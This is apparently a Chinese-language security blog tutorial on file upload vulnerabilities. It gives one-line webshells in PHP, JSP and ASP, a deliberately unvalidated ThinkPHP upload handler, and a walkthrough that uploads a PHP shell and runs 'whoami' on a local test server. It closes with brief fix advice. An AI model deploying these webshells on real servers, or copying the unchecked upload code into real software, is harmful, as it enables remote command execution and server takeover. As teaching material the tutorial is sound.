---
# 当前页面内容标题
title: 文件上传漏洞
# 当前页面图标
icon: "hot"
# 分类
sticky: false
# 是否收藏在博客主题的文章列表中，当填入数字时，数字越大，排名越靠前。
star: false
# 是否将该文章添加至文章列表中
article: false
# 是否将该文章添加至时间线中
timeline: false
index: false
date: 2022-02-09
dir:
    link: true
---

## 漏洞描述

文件上传，在web程序中是一个非常常见的功能，而文件上传漏洞则是一个非常严重的漏洞，造成这个漏洞的原因就是，目标主机对文件上传的类型，没有有效的校验，导致攻击者可以上传恶意文件，从而获得服务器的特权访问，并进一步对服务器进行攻击。

下面是常见的一句话木马：

::: tabs

@tab PHP

```php
<?php eval($_POST['shell']) ?>
```

@tab JSP

```java
  <%
    Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream inputStream = process.getInputStream();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while ((line = bufferedReader.readLine()) != null){
      response.getWriter().println(line);
    }
  %>

```

@tab ASP

```php
<%eval request("chopper")%>
```

:::

## 漏洞原理

下面是一个通过PHP制作的一个文件上传漏洞

主页`index.html`：

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>首页</title>
</head>
<body>
<p>欢迎{$user}</p>
<!--一个简单的form表单-->
<form action="{:url('index/upload')}" enctype="multipart/form-data" method="post" >
    <input type="file" name="image" /> <br>
    <input type="submit" value="上传" />
</form>
</body>
</html>
```

上传文件代码：

```php
public function upload(): string
{
    if(Session('?user')){
        $file = request()->file('image');
        $savepath = \think\facade\Filesystem::disk('public')->putFile('topic', $file);
        return "上传文件到：" . $savepath;
    }
    return "<a href='//'>请先登录</a>";
}
```

从上面的代码中，我没有对上传文件进行任何校验，并且返回上传的路径，从而人为的造成一个文件上传漏洞

下面是漏洞利用

准备一句话木马（xxx.php）：

```php
<?php @eval($_GET['shell']);?>
```

![image-20230210211508569](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20230210211508569.png)

木马上传成功后，服务器会返回上传路径

![image-20230210211537159](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20230210213337685.png)

`thinkphp`返回的路径是`public/storage`目录的相对路径，又因为`public`目录下的文件是公开的，所以添加上在路径前缀添加上`storage`后就可以直接访问。

```
http://127.0.0.1/storage/topic/20230210/021f42ae42edae7a913d58e9f0da2107.php?shell=system(%27whoami%27);
```

![image-20230210213337685](https://shihao-icu-1304033786.cos.ap-shanghai.myqcloud.com/shihao.icu/image-20230210211537159.png)

## 修复建议

1. 严格检验文件的类型，设置白名单
2. 重新命名并修改后缀
